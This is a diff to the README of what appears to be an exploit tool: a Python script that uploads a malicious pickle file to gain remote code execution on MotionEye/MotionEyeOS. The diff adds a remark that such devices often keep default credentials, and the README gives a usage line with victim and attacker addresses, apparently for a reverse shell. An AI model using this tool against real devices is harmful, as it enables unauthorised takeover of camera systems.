@@ -1,6 +1,5 @@
 # MotionEye/MotionEyeOS Authenticated RCE
-A Python 3 script that uploads a tasks.pickle file that enables RCE in MotionEye
-
+A Python 3 script that uploads a tasks.pickle file that enables RCE in MotionEye. You need administrator credentials, so it should not be that big of a deal. Unfortunately, MotionEye/MotionEye tend to be ran with default credentials. 
 Example:
 
 main.py --victim 192.168.1.2 --attacker 192.168.1.3:4444
